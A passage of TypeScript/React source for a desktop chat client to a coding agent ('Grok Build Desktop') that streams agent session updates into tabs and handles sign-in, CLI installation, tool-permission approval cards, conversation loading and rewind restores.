    try {
      await update.downloadAndInstall();
      // Stop the agents ourselves instead of letting the relaunch orphan them: a
      // grok killed without its teardown leaves its approval gate armed on disk.
      await shutdownAll().catch(() => {});
      await relaunch();
    } catch (e) {
      setUpdating(false);
      setUpdateGate(null);
      setNotice(`Update failed: ${e}`);
    }
  }

  const appendText = useCallback((tabId: string, kind: TextItem["kind"], id: string, chunk: string) => {
    updateTab(tabId, (tab) => {
      const last = tab.items[tab.items.length - 1];
      if (last && isText(last) && last.id === id) {
        return { ...tab, items: [...tab.items.slice(0, -1), { ...last, text: last.text + chunk }] };
      }
      return { ...tab, items: [...tab.items, { id, kind, text: chunk }] };
    });
  }, [updateTab]);

  const onUpdate = useCallback(
    (tabId: string, u: SessionUpdate) => {
      if (!tabsRef.current.some((tab) => tab.id === tabId)) return;

      const replay = sessionReplays.current.get(tabId);
      if (replay) {
        replay.push(u);
        return;
      }

      switch (u.sessionUpdate) {
        case "agent_message_chunk": {
          const bubbles = openBubbles.current.get(tabId) ?? {};
          const id = bubbles.answer ?? itemId("a");
          if (!bubbles.answer) openBubbles.current.set(tabId, { ...bubbles, answer: id });
          appendText(tabId, "answer", id, u.content?.text ?? "");
          break;
        }
        case "agent_thought_chunk": {
          const bubbles = openBubbles.current.get(tabId) ?? {};
          const id = bubbles.thought ?? itemId("t");
          if (!bubbles.thought) openBubbles.current.set(tabId, { ...bubbles, thought: id });
          appendText(tabId, "thought", id, u.content?.text ?? "");
          break;
        }
        case "tool_call": {
          const id = u.toolCallId ?? itemId("tool");
          updateTab(tabId, (tab) => ({
            ...tab,
            items: [
              ...tab.items,
              // Live-only: stamp the moment the call started so the card can show a
              // duration once it finishes. Everything else comes from toolMeta.ts so
              // this can't drift from what reduceUpdates builds on replay.
              { id, kind: "tool", startedAt: Date.now(), ...toolFieldsFromCall(u) },
            ],
          }));
          // A tool ran, so any answer text after it belongs in a fresh bubble.
          openBubbles.current.set(tabId, {});
          break;
        }
        case "tool_call_update": {
          updateTab(tabId, (tab) => ({
            ...tab,
            items: tab.items.map((i) => {
              if (!isTool(i) || i.id !== u.toolCallId) return i;
              const merged = { ...i, ...mergeToolUpdate(i, u) };
              // Stamp completion the instant status crosses into a terminal state —
              // not on every update to that state, or a resend would push the clock.
              const justEnded =
                (merged.status === "completed" || merged.status === "failed") && !i.endedAt;
              return justEnded ? { ...merged, endedAt: Date.now() } : merged;
            }),
          }));
          break;
        }
        case "plan": {
          const entries = u.entries ?? [];
          // Decide the plan item's id outside the updater so the updater stays a
          // pure function (no ref mutation under StrictMode double-invocation).
          let id = planIds.current.get(tabId);
          if (!id) {
            id = itemId("plan");
            planIds.current.set(tabId, id);
          }
          updateTab(tabId, (tab) => ({
            ...tab,
            items: tab.items.some((i) => isPlan(i) && i.id === id)
              ? tab.items.map((i) => (isPlan(i) && i.id === id ? { ...i, entries } : i))
              : [...tab.items, { id, kind: "plan", entries }],
          }));
          openBubbles.current.set(tabId, {});
          break;
        }
        case "available_commands_update": {
          // Session metadata, not a renderable Item — live-only, deliberately
          // absent from reduceUpdates/replay (see lib/bridge.ts).
          updateTab(tabId, (tab) => ({ ...tab, availableCommands: u.availableCommands ?? [] }));
          break;
        }
        default:
          break; // user_message_chunk: the echo of our own prompt, no need to show
      }
    },
    [appendText, updateTab],
  );

  /// The other half of `authenticate`. Sign-in is now fire-and-forget in Rust, so
  /// the promise resolving means "the request is on the wire" — not "you're signed
  /// in". Only `acp-auth {status:"ok"}` means that, which is why opening the
  /// session and entering the chat live here and nowhere else.
  const finishSignIn = useCallback(
    async (tabId: string) => {
      const tab = tabsRef.current.find((candidate) => candidate.id === tabId);
      if (!tab) return;
      // Hold the sign-in screen — with a live line — across `openSession` rather
      // than cutting to a chat that can't accept a prompt yet. Same reason
      // `needsAuth` stays true until there's a session to show.
      updateTab(tabId, (current) => ({ ...current, authPending: "opening", error: null }));
      beginConnect(tabId);
      try {
        const sessionId = await openSession(tabId, tab.cwd);
        if (!tabsRef.current.some((candidate) => candidate.id === tabId)) return;
        updateTab(tabId, (current) => ({
          ...current,
          sessionId,
          needsAuth: false,
          authMethods: [],
          authPending: null,
          error: null,
        }));
        setStage("chat");
      } catch (e) {
        updateTab(tabId, (current) => ({ ...current, authPending: null, error: String(e) }));
      } finally {
        endConnect(tabId);
      }
    },
    [beginConnect, endConnect, updateTab],
  );

  useEffect(() => {
    const off = subscribe({
      onUpdate,
      onSessionInfo: (tabId, info) => {
        updateTab(tabId, (tab) => ({ ...tab, sessionInfo: info }));
      },
      // `x.ai/session_notification` — grok's non-standard side channel for
      // spawned subagents and backgrounded/scheduled tasks. `parseNotify`
      // returns null for anything not task/subagent-shaped (defensive parse,
      // never throws), so most notifications are silently ignored here.
      onNotify: (tabId, payload) => {
        const rec = parseNotify(payload);
        if (!rec) return;
        updateTab(tabId, (tab) => ({ ...tab, tasks: mergeTask(tab.tasks ?? [], rec, Date.now()) }));
      },
      onAuth: (tabId, auth) => {
        if (!tabsRef.current.some((tab) => tab.id === tabId)) return;
        clearAuthTimer(tabId);
        if (auth.status === "ok") {
          // Late-ok-wins: Cancel is client-side, so a sign-in the user "cancelled"
          // can still land. It really happened — grok wrote the credentials — and
          // sending them back to a sign-in button would be the dishonest branch.
          void finishSignIn(tabId);
          return;
        }
        const tab = tabsRef.current.find((candidate) => candidate.id === tabId);
        // Already cancelled: don't overwrite that copy with a stale failure.
        if (!tab?.authPending) return;
        updateTab(tabId, (current) => ({
          ...current,
          authPending: null,
          error:
            auth.status === "timed_out"
              ? "Sign-in timed out. If you finished in the browser, try again — it may already be done."
              : auth.message ?? "Sign-in failed.",
        }));
      },
      onConnect: (tabId, event) => {
        if (!tabsRef.current.some((tab) => tab.id === tabId)) return;
        const line = CONNECT_COPY[event.stage];
        // Stages are decoration and the list is open-ended: an unrecognized one
        // leaves the previous line alone rather than blanking or breaking it.
        if (!line) return;
        updateTab(tabId, (tab) => (tab.connecting ? { ...tab, connectLine: line } : tab));
      },
      // Installing the CLI is machine-wide, so `acp-install` stays broadcast: a
      // window watching the install screen must follow an install started from a
      // *different* window. Both stage writes are functionally guarded — a window
      // already in `chat` has a live grok and its own UI, and flipping it to
      // `installing`/`ready` from under a running conversation would replace that
      // whole screen over an event that isn't about it.
      onInstall: (event) => {
        if (event.status === "started") {
          setStage((s) => (s === "needs-install" ? "installing" : s));
          setInstallLine(INSTALL_COPY.installing);
          setInstallDetail(null);
        } else if (event.status === "stage") {
          setInstallLine(INSTALL_COPY[event.stage ?? ""] ?? INSTALL_COPY.installing);
          setInstallDetail(event.detail ?? null);
        } else {
          // done and failed both end the run; `doInstall`'s own catch owns the
          // error copy, so there's nothing left for a status line to say.
          if (event.status === "done") {
            setStage((s) => (s === "installing" || s === "needs-install" ? "ready" : s));
          }
          setInstallLine(null);
          setInstallDetail(null);
        }
      },
      onPermission: (tabId, req) => {
        if (!tabsRef.current.some((tab) => tab.id === tabId)) return;
        openBubbles.current.set(tabId, {});
        updateTab(tabId, (tab) => ({
          ...tab,
          items: [...tab.items, { id: itemId("p"), kind: "ask", req, decided: null, failed: null }],
        }));
      },
      onTurnEnd: (tabId, result) => {
        if (!tabsRef.current.some((tab) => tab.id === tabId)) return;
        const meta = result._meta;
        const hasTokenData = [
          meta?.totalTokens,
          meta?.inputTokens,
          meta?.outputTokens,
          meta?.reasoningTokens,
          meta?.cachedReadTokens,
        ].some(isFiniteNumber);
        const usageItem: UsageItem | null = hasTokenData
          ? {
              id: itemId("usage"),
              kind: "usage",
              modelId: meta?.modelId,
              totalTokens: meta?.totalTokens,
              inputTokens: meta?.inputTokens,
              outputTokens: meta?.outputTokens,
              reasoningTokens: meta?.reasoningTokens,
              cachedReadTokens: meta?.cachedReadTokens,
              apiDurationMs: meta?.usage?.apiDurationMs,
            }
          : null;
        updateTab(tabId, (tab) => ({
          ...tab,
          busy: false,
          items: usageItem ? [...tab.items, usageItem] : tab.items,
          usageTokens: tab.usageTokens + (isFiniteNumber(meta?.totalTokens) ? meta.totalTokens : 0),
        }));
        openBubbles.current.set(tabId, {});
        planIds.current.set(tabId, null); // next turn starts a fresh plan
        setHistoryRevision((revision) => revision + 1);
      },
      onError: (tabId, message) => {
        if (!tabsRef.current.some((tab) => tab.id === tabId)) return;
        openBubbles.current.set(tabId, {});
        updateTab(tabId, (tab) => ({
          ...tab,
          busy: false,
          items: [...tab.items, { id: itemId("e"), kind: "error", text: message }],
        }));
      },
      onClosed: (tabId) => {
        if (!tabsRef.current.some((tab) => tab.id === tabId)) return;
        updateTab(tabId, (tab) => ({ ...tab, busy: false }));
      },
    });
    return () => {
      off.then((fn) => fn());
    };
  }, [clearAuthTimer, finishSignIn, onUpdate, updateTab]);

  /// Answering can now legitimately fail: Rust consumes the request on the first
  /// answer and rejects any second one, so an approval card open in two places
  /// only counts once. Which means "the user clicked Allow" and "the edit was
  /// allowed" are different facts, and `decided` is only ever the second one —
  /// writing it regardless, as this used to, tells the user an edit went through
  /// that didn't.
  async function decide(tab: Tab, item: AskItem, optionId: string | null, label: string) {
    const settle = (patch: Partial<AskItem>) =>
      updateTab(tab.id, (current) => ({
        ...current,
        items: current.items.map((i) => (isAsk(i) && i.id === item.id ? { ...i, ...patch } : i)),
      }));
    try {
      // Hook-gated requests (the path that fires today) go back through respondHook;
      // ACP requests through respondPermission. `optionId === "allow"` means approve.
      if (item.req.hookToolUseId) {
        await respondHook(tab.id, item.req.hookToolUseId, optionId === "allow");
      } else {
        await respondPermission(tab.id, item.req.requestId, optionId);
      }
    } catch (e) {
      const message = String(e);
      settle({
        // Rust's ownership rejection is the expected failure and deserves copy a
        // person can act on; anything else is unexpected and is shown verbatim
        // rather than dressed up as something we recognize.
        failed: message.includes("isn't yours")
          ? "Not yours — answered in another window."
          : message,
      });
      return;
    }
    settle({ decided: label });
  }

  async function doInstall() {
    setStage("installing");
    setNotice(null);
    setInstallLine(INSTALL_COPY.installing);
    setInstallDetail(null);
    try {
      await installGrok();
      // A window can't have a project before grok exists in practice, but if it
      // somehow does, land in it rather than at a launcher it doesn't need.
      if (projectCwd) await enterProject(projectCwd);
      else setStage("ready");
    } catch (e) {
      setNotice(String(e));
      setStage("needs-install");
    } finally {
      setInstallLine(null);
      setInstallDetail(null);
    }
  }

  function addTab(cwd: string): Tab {
    const tab = createTab(cwd);
    setTabs((current) => {
      const nextTabs = [...current, tab];
      tabsRef.current = nextTabs;
      return nextTabs;
    });
    setActiveTabId(tab.id);
    return tab;
  }

  /// Start a fresh conversation in a tab. Every caller passes the window's own
  /// project — a tab never picks its own folder any more.
  async function startChat(tabId: string, path: string) {
    // Connect no longer freezes the UI, which means the button is now clickable
    // while it runs. Mirrors submit()'s `if (!text || tab.busy) return;` —
    // without it a double-click spawns a second grok the first one never releases.
    if (tabsRef.current.find((tab) => tab.id === tabId)?.connecting) return;
    beginConnect(tabId);
    try {
      const res = await connect(tabId, path);
      if (!tabsRef.current.some((tab) => tab.id === tabId)) {
        await cancelRun(tabId).catch(() => {});
        return;
      }
      updateTab(tabId, (tab) => ({
        ...tab,
        cwd: path,
        sessionId: res.session_id,
        attachments: [],
        needsAuth: res.needs_auth,
        authMethods: res.auth_methods,
        error: null,
      }));
      setDragging(false);
      setHistoryRevision((revision) => revision + 1);
    } catch (e) {
      updateTab(tabId, (tab) => ({ ...tab, error: String(e) }));
    } finally {
      endConnect(tabId);
    }
  }

  /// This window now owns `cwd`: show it, and put the user straight into a chat
  /// they can type in. A project is not a reason to make someone pick a
  /// conversation first — the sidebar is beside them for that, not in front.
  ///
  /// Only ever called once Rust agrees this window owns the folder: either
  /// `window_project()` said so at startup, or `open_project` came back
  /// `"adopted"`. Nothing else may set `projectCwd` — a cwd with no registry
  /// entry behind it is what makes `connect` fail with "That window was closed."
  ///
  /// `resumeSessionId` is the `--resume <id>` case: land on that conversation
  /// instead of a new one. It goes through `openConversation` like every other
  /// way of opening a conversation — same loader, same `finally`, no second path.
  async function enterProject(cwd: string, resumeSessionId?: string | null) {
    setProjectCwd(cwd);
    setStage("chat");
    const tab = addTab(cwd);
    if (!resumeSessionId) {
      await startChat(tab.id, cwd);
      return;
    }
    // Only for the title: Rust already resolved this id to this project, so a
    // miss means the listing failed, not that the conversation isn't there.
    // Resuming with an unknown title beats refusing to resume at all.
    const known = await listSessions(cwd)
      .then((all) => all.find((session) => session.id === resumeSessionId))
      .catch(() => undefined);
    await openConversation(known ?? { id: resumeSessionId, cwd, title: "" }, tab);
  }

  /// Hand a folder to Rust and do what it says. `"adopted"` is the only outcome
  /// this window acts on; `"focused"` and `"opened"` both mean some other window
  /// has the project now and this one stays exactly where it is.
  async function claimProject(path: string): Promise<boolean> {
    // `open_project` is clickable while it runs, and the second call would land
    // after the first has reserved the folder — so it'd come back "focused" and
    // this window would quietly do nothing. Same shape as startChat's guard.
    if (openingProject) return false;
    setOpeningProject(true);
    setNotice(null);
    try {
      const outcome = await openProject(path);
      if (outcome.kind !== "adopted") return false;
      await enterProject(path);
      return true;
    } catch (e) {
      setNotice(String(e));
      return false;
    } finally {
      setOpeningProject(false);
    }
  }

  async function pickProject() {
    const picked = await open({ directory: true, multiple: false, title: "Choose a project folder" });
    if (typeof picked !== "string") return;
    await claimProject(picked);
  }

  async function openRecent(path: string) {
    await claimProject(path);
  }

  // A new tab is a parallel conversation in THIS WINDOW'S project (e.g. one agent
  // fixes a bug while another writes tests, same repo). It has no folder question
  // to answer any more: the window already answered it.
  async function addRun() {
    if (!projectCwd) return;
    const tab = addTab(projectCwd);
    await startChat(tab.id, projectCwd);
  }

  addRunRef.current = addRun;

  /// Kicks off a sign-in and returns. The outcome arrives as `acp-auth` and is
  /// handled in `finishSignIn` — awaiting `authenticate` here would only tell us
  /// the request was sent, and treating that as success is how the app used to
  /// walk into an unauthenticated chat.
  function signIn(tab: Tab, methodId: string) {
    if (tab.authPending) return;
    updateTab(tab.id, (current) => ({ ...current, authPending: "contacting", error: null }));
    clearAuthTimer(tab.id);
    authTimers.current.set(
      tab.id,
      window.setTimeout(() => {
        authTimers.current.delete(tab.id);
        updateTab(tab.id, (current) =>
          current.authPending === "contacting" ? { ...current, authPending: "browser" } : current,
        );
      }, 1500),
    );
    authenticate(tab.id, methodId).catch((e) => {
      clearAuthTimer(tab.id);
      updateTab(tab.id, (current) => ({ ...current, authPending: null, error: String(e) }));
    });
  }

  /// Cancel is ours alone: grok is waiting on a human in a browser and has no way
  /// to be told to stop. So we stop listening, and say exactly that. If the
  /// sign-in lands anyway, `onAuth` takes it.
  function cancelSignIn(tabId: string) {
    clearAuthTimer(tabId);
    updateTab(tabId, (current) => ({
      ...current,
      authPending: null,
      error: "Cancelled — you can sign in again.",
    }));
  }

  async function submit() {
    const tab = tabsRef.current.find((candidate) => candidate.id === activeTabId);
    if (!tab) return;
    const prompt = tab.draft.trim();
    const mentions = tab.attachments.map((attachment) => toMention(tab.cwd, attachment)).join(" ");
    const text = prompt && mentions ? `${prompt}\n\n${mentions}` : prompt || mentions;
    if (!text || tab.busy) return;
    updateTab(tab.id, (current) => ({
      ...current,
      draft: "",
      attachments: [],
      busy: true,
      items: [...current.items, { id: itemId("u"), kind: "you", text }],
    }));
    openBubbles.current.set(tab.id, {});
    try {
      await sendPrompt(tab.id, text);
    } catch (e) {
      updateTab(tab.id, (current) => ({
        ...current,
        busy: false,
        items: [...current.items, { id: itemId("e"), kind: "error", text: String(e) }],
      }));
    }
  }

  function closeTab(tabId: string) {
    void cancelRun(tabId).catch(() => {});
    const currentTabs = tabsRef.current;
    const index = currentTabs.findIndex((tab) => tab.id === tabId);
    if (index < 0) return;
    const nextTabs = currentTabs.filter((tab) => tab.id !== tabId);
    tabsRef.current = nextTabs;
    setTabs(nextTabs);
    openBubbles.current.delete(tabId);
    planIds.current.delete(tabId);
    clearAuthTimer(tabId);
    clearConnectTimers(tabId);
    if (activeTabId === tabId) {
      setActiveTabId(nextTabs[Math.min(index, nextTabs.length - 1)]?.id ?? null);
    }
    setDragging(false);
    // The window keeps its project when its last tab closes — closing a
    // conversation is not the same as letting go of the folder.
  }

  /// Clicking a conversation in the sidebar opens it, live, right here. There is
  /// no read-only transcript step any more: it made you view a conversation, then
  /// decide to continue it, before you could say anything.
  ///
  /// From a launcher the session's project has to be claimed first — the row
  /// already carries its `cwd`, so we hand that to Rust and let it decide. From a
  /// project window the folder is settled and we go straight to the conversation.
  async function openConversationFromSidebar(session: SessionMeta) {
    if (!projectCwd) {
      if (openingProject) return;
      setOpeningProject(true);
      setNotice(null);
      try {
        const outcome = await openProject(session.cwd);
        // Another window owns this project — it was raised or built, and it will
        // show its own conversations. Nothing left for this window to do.
        if (outcome.kind !== "adopted") return;
      } catch (e) {
        setNotice(String(e));
        return;
      } finally {
        setOpeningProject(false);
      }
      setProjectCwd(session.cwd);
      setStage("chat");
      await openConversation(session, addTab(session.cwd));
      return;
    }

    // Already open — or already opening. Matching `loadingSessionId` too is what
    // stops a second click during the load from opening a duplicate tab of the
    // conversation that's still on its way in.
    const existing = tabsRef.current.find(
      (tab) => tab.sessionId === session.id || tab.loadingSessionId === session.id,
    );
    if (existing) {
      setActiveTabId(existing.id);
      return;
    }

    // Reuse a tab the user hasn't said anything in yet rather than stacking an
    // empty new chat next to the conversation they asked for.
    const pristine = tabsRef.current.find(
      (tab) => tab.items.length === 0 && !tab.busy && !tab.connecting,
    );
    const tab = pristine ?? addTab(projectCwd);
    setActiveTabId(tab.id);
    await openConversation(session, tab);
  }

  async function openConversation(session: ConversationRef, tab: Tab) {
    // Claim the conversation on the tab before the first await, so the gap
    // between the click and the load isn't a window in which this tab looks free.
    updateTab(tab.id, (current) => ({
      ...current,
      loadingSessionId: session.id,
      title: session.title || null,
    }));
    beginConnect(tab.id);
    try {
      if (!tab.sessionId) {
        const connected = await connect(tab.id, session.cwd);
        if (!tabsRef.current.some((candidate) => candidate.id === tab.id)) {
          await cancelRun(tab.id).catch(() => {});
          return;
        }
        updateTab(tab.id, (current) => ({
          ...current,
          cwd: session.cwd,
          sessionId: connected.session_id,
          attachments: [],
          needsAuth: connected.needs_auth,
          authMethods: connected.auth_methods,
          error: null,
        }));
        if (connected.needs_auth) return;
      }

      await reloadTranscript(tab, session.cwd, session.id);
    } catch (error) {
      sessionReplays.current.delete(tab.id);
      updateTab(tab.id, (current) => ({ ...current, busy: false, error: String(error) }));
    } finally {
      endConnect(tab.id);
      // Every exit lands here — success, failure, and the two "tab went away"
      // early returns. A stuck `loadingSessionId` would make the sidebar think
      // this conversation is open forever and refuse to ever reopen it.
      updateTab(tab.id, (current) => ({ ...current, loadingSessionId: null }));
    }
  }

  /// The replay-reload core of `openConversation`, factored out so a rewind
  /// restore can rebuild a tab's transcript from scratch the exact same way
  /// a freshly opened conversation does, instead of hand-patching `tab.items`
  /// against a server-side state that just changed under it. Re-arms the
  /// replay buffer, clears the per-tab bubble/plan tracking so stale ids from
  /// the old transcript can't leak into the new one, then defers to
  /// `loadSession`/`reduceUpdates` — the single source of truth for turning
  /// ACP updates into `Item[]`.
  async function reloadTranscript(tab: Tab, cwd: string, sessionId: string) {
    sessionReplays.current.set(tab.id, []);
    updateTab(tab.id, (current) => ({
      ...current,
      items: [],
      busy: false,
      attachments: [],
      usageTokens: 0,
      error: null,
    }));
    openBubbles.current.set(tab.id, {});
    planIds.current.delete(tab.id);

    const loadedSessionId = await loadSession(tab.id, cwd, sessionId);
    const updates = sessionReplays.current.get(tab.id) ?? [];
    sessionReplays.current.delete(tab.id);
    if (!tabsRef.current.some((candidate) => candidate.id === tab.id)) return;
    updateTab(tab.id, (current) => ({
      ...current,
      sessionId: loadedSessionId,
      items: reduceUpdates(updates),
      busy: false,
      error: null,
    }));
    setHistoryRevision((revision) => revision + 1);
  }

  /// Opens the Rewind panel for a "you" bubble and fetches this tab's
  /// checkpoint list. Errors are shown honestly inside the panel rather than
  /// silently leaving it stuck on "Loading…" — the wire shape of
  /// `x.ai/rewind/points` is unverified, so a malformed response degrades to
  /// an empty list via `normalizeRewindPoints` rather than throwing here.
  async function openRewind(tab: Tab, item: TextItem) {
    setRewindOpen(true);
    setRewindLoading(true);
    setRewindError(null);
    setRewindPointsList([]);
    // Best-effort: a point whose id happens to equal this message's id can be
    // pre-highlighted. If grok's point ids don't line up with our item ids,
    // this just stays null and the panel opens with nothing pre-selected —
    // never a crash, never a wrong highlight.
    setRewindFocusId(item.id);
    try {
      const raw = await rewindPoints(tab.id);
      const points = normalizeRewindPoints(raw);
      setRewindPointsList(points);
      if (!points.some((point) => point.id === item.id)) {
        setRewindFocusId(null);
      }
    } catch (error) {
      setRewindError(String(error));
    } finally {
      setRewindLoading(false);
    }
  }

  /// Runs a confirmed restore (the panel has already gated destructive scopes
  /// behind its own two-step confirm before calling this). On success the
  /// server-side session state has changed, so the transcript is rebuilt via
  /// `reloadTranscript` — the same replay path a freshly opened conversation
  /// uses — rather than hand-patching `tab.items` against a state we didn't
  /// observe directly.
  async function confirmRewind(pointId: string, mode: RewindMode) {
    const tab = activeTab;
    if (!tab) return;
    try {
      await rewindExecute(tab.id, pointId, mode);
      if (tab.sessionId) {
        await reloadTranscript(tab, tab.cwd, tab.sessionId);
      }
      setRewindOpen(false);
    } catch (error) {
      setRewindError(String(error));
    }
  }

  // ---- Cmd/Ctrl+K palette + "/" and "@" composer autocomplete ----
  //
  // Caret math and ranking are all in lib/commands.ts (pure, unit-tested); this
  // block is only wiring: read the caret, ask detectTrigger what's active, turn
  // that into AcItem[], and reset the ephemeral bits (highlighted row, Esc
  // dismissal) whenever the trigger identity itself changes.
  const composerText = activeTab?.draft ?? "";
  const trigger = detectTrigger(composerText, Math.min(composerCaret, composerText.length));
  const acItems: AcItem[] = trigger.kind === null || !activeTab
    ? []
    : trigger.kind === "slash"
      ? filterSlash(activeTab.availableCommands ?? [], trigger.query).map((c) => ({
          id: c.name,
          label: `/${c.name}`,
          sub: c.description ?? c.hint,
        }))
      : filterFiles(activeTab.projectFiles ?? [], trigger.query).map((f) => ({ id: f, label: f }));
  const visibleAcItems = acDismissed ? [] : acItems;

  // A new/changed trigger re-arms the dropdown (undoes a previous Esc) and
  // snaps the highlight back to the top match.
  useEffect(() => {
    setAcDismissed(false);
    setAcIndex(0);
  }, [trigger.kind, trigger.start, trigger.query]);

  // Switching tabs must not carry over the previous tab's caret position —
  // caret 0 on the new tab's own draft never triggers detectTrigger, so this
  // is the same as "no trigger" until the user actually clicks/types there.
  useEffect(() => {
    setComposerCaret(0);
  }, [activeTabId]);

  // Lazily fetch the project's file list on the first "@" trigger, once per
  // tab, and cache it on the tab so retyping "@" doesn't re-walk the tree.
  useEffect(() => {
    if (!activeTab || trigger.kind !== "mention" || activeTab.projectFiles) return;
    const tabId = activeTab.id;
    const cwd = activeTab.cwd;
    let cancelled = false;
    listProjectFiles(cwd)
      .then((files) => {
        if (!cancelled) updateTab(tabId, (tab) => (tab.projectFiles ? tab : { ...tab, projectFiles: files }));
      })
      .catch(() => {
        // A failed listing degrades to "no matches", not a crash — the mention
        // trigger just won't offer anything until it's tried again.
        if (!cancelled) updateTab(tabId, (tab) => (tab.projectFiles ? tab : { ...tab, projectFiles: [] }));
      });
    return () => {
      cancelled = true;
    };
    // Primitive deps only: `activeTab` itself is a fresh object on every tabs
    // update (streaming chunks, etc.), which would otherwise re-fire this on
    // every keystroke of an unrelated turn. The `!activeTab.projectFiles`
    // guard above is what actually decides whether to fetch.
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [activeTab?.id, activeTab?.cwd, activeTab?.projectFiles, trigger.kind, updateTab]);

  /// Replace the live trigger token with the picked slash command or file
  /// mention, move the caret past it, and put focus back in the textarea so
  /// picking with the mouse doesn't strand the cursor.
  function applyAcPick(item: AcItem) {
    if (!activeTab) return;
    const replacement =
      trigger.kind === "slash"
        ? `/${item.id} `
        : item.id.includes(" ")
          ? `@"${item.id}" `
          : `@${item.id} `;
    const applied = applyPick(composerText, trigger, replacement);
    updateActiveTab((tab) => ({ ...tab, draft: applied.text }));
    setComposerCaret(applied.caret);
    setAcDismissed(true);
    requestAnimationFrame(() => {
      const el = textareaRef.current;
      if (el) {
        el.focus();
        el.setSelectionRange(applied.caret, applied.caret);
      }
    });
  }

  // App-action palette: real handlers, not placeholders. "New chat" and "New
  // tab" are the same action (addRun), per the wiring spec.
  const paletteActions: PaletteAction[] = useMemo(() => {
    const actions: PaletteAction[] = [
      {
        id: "new-chat",
        title: "New chat",
        keywords: "new tab conversation",
        run: () => {
          void addRun();
        },
      },
      {
        id: "open-folder",
        title: "Open folder…",
        keywords: "project folder open",
        run: () => {
          void pickProject();
        },
      },
      {
        id: "toggle-sidebar",
        title: sidebarOpen ? "Hide sidebar" : "Show sidebar",
        hint: "⌘B",
        keywords: "sidebar panel toggle show hide",
        run: () => setSidebarOpen((open) => !open),
      },
      {
        id: "focus-search",
        title: "Focus search",
        keywords: "search conversations find history",
        run: () => {
          searchInputRef.current?.focus();
        },
      },
      {
        id: "preferences",
        title: "Preferences",
        hint: "⌘,",
        keywords: "preferences settings theme appearance model effort about updates keyboard",
        run: () => setPrefsOpen(true),
      },
      {
        id: "tasks",
        title: "Tasks",
        keywords: "tasks subagents background scheduled jobs dashboard",
        run: () => setTasksOpen(true),
      },
    ];
    if (activeTabId) {
      actions.push({
        id: "close-tab",
        title: "Close tab",
        hint: "⌘W",
        keywords: "close tab conversation",
        run: () => closeTab(activeTabId),
      });
    }
    if (activeTab?.items?.length) {
      actions.push({
        id: "export-receipt",
        title: "Export receipt…",
        keywords: "receipt export markdown share save",
        run: () => setReceiptOpen(true),
      });
    }
    return actions;
  }, [sidebarOpen, activeTabId, activeTab]);

  // Gate the effort picker on grok having actually advertised an effort/model
  // slash command *for this session* — there's no dedicated RPC to change it,
  // only the CLI's own convention, and offering a picker that sends a command
  // grok never mentioned would just fail silently.
  const effortCommandAvailable = (activeTab?.availableCommands ?? []).some((c) =>
    /^(effort|model)$/.test(c.name),
  );
  const onSetEffort = useCallback(
    (level: string) => {
      if (!activeTab || activeTab.busy) return;
      void sendPrompt(activeTab.id, `/effort ${level}`);
    },
    [activeTab],
  );
  // Read-only mirror of the palette actions, title+hint only — Preferences'
  // Keyboard section lists shortcuts, it never triggers them.
  const prefsShortcuts = useMemo(
    () => paletteActions.filter((a) => a.hint).map((a) => ({ title: a.title, hint: a.hint })),
    [paletteActions],
  );

  const banner = update ? (
    <UpdateBanner
      update={update}
      busy={updating}
      gate={updateGate}
      onAsk={askUpdate}
      onConfirm={runUpdate}
      onCancel={() => setUpdateGate(null)}
    />
  ) : null;

  if (stage === "checking") return <Splash title="Grok Build Desktop" line="Getting things ready…" />;

  if (stage === "needs-install" || stage === "installing") {
    return (
      <Splash
        banner={banner}
        title="Grok Build Desktop"
        line="Grok Build isn't on this computer yet. We'll install it for you — no terminal needed."
      >
        <button className="primary" onClick={doInstall} disabled={stage === "installing"}>
          {stage === "installing" ? "Installing…" : notice ? "Try again" : "Install Grok Build"}
        </button>
        <Progress line={stage === "installing" ? installLine : null} detail={installDetail} />
        {notice && <p className="notice error">{notice}</p>}
      </Splash>
    );
  }

  const query = historyQuery.trim().toLocaleLowerCase();
  const filteredSessions = sessionRows(historySessions, historySearchHits, query);

  // Which conversations are open in a tab of this window, and which one you're
  // looking at. Derived from the tabs themselves — a second source of truth here
  // could disagree with the tab strip, and the tab strip is the one that's real.
  // A tab loading a conversation counts as open: it is, the load just isn't done.
  const openIds = new Map<string, string>();
  for (const tab of tabs) {
    const id = tab.sessionId ?? tab.loadingSessionId;
    if (id) openIds.set(id, tab.id);
  }
  const activeSessionId = activeTab?.sessionId ?? activeTab?.loadingSessionId ?? null;

  // Which answer bubble is streaming right now, for the live caret. It's the last item while
  // the tab is busy, and only an answer: the reducer keeps the open answer as the last item
  // until a tool call, plan, permission, or turn-end closes it (the same points that reset
  // `openBubbles`), so this mirrors that state without reading the ref during render.
  const lastItem = activeTab?.items[activeTab.items.length - 1];
  const streamingId =
    activeTab?.busy && lastItem && isText(lastItem) && lastItem.kind === "answer"
      ? lastItem.id
      : null;

  return (
    <div className="shell">
      {/* The window's own top bar. With `titleBarStyle: Overlay` the OS titlebar is gone and
          content reaches the top edge, so this strip carries the sidebar toggle at its left
          (past the traffic lights) and is otherwise a drag handle. The drag region is the
          empty spacer, NOT the whole bar: the toggle is a real button and mustn't be a drag
          surface, or its clicks get eaten by the drag handler. */}
      <div className="titlebar">
        <button
          className="sidebar-toggle"
          onClick={() => setSidebarOpen((open) => !open)}
          title={sidebarOpen ? "Hide sidebar (⌘B)" : "Show sidebar (⌘B)"}
          aria-label="Toggle sidebar"
          aria-pressed={sidebarOpen}
        >
          <svg
            width="15"
            height="15"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            aria-hidden="true"
          >
            <rect x="3" y="3" width="18" height="18" rx="2" />
            <line x1="9" y1="3" x2="9" y2="21" />
          </svg>
        </button>
        <div className="titlebar-drag" data-tauri-drag-region />
        <button
          className="prefs-toggle"
          onClick={() => setPrefsOpen(true)}
          title="Preferences (⌘,)"
          aria-label="Open preferences"
        >
          <svg
            width="15"
            height="15"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            aria-hidden="true"
          >
            <circle cx="12" cy="12" r="3" />
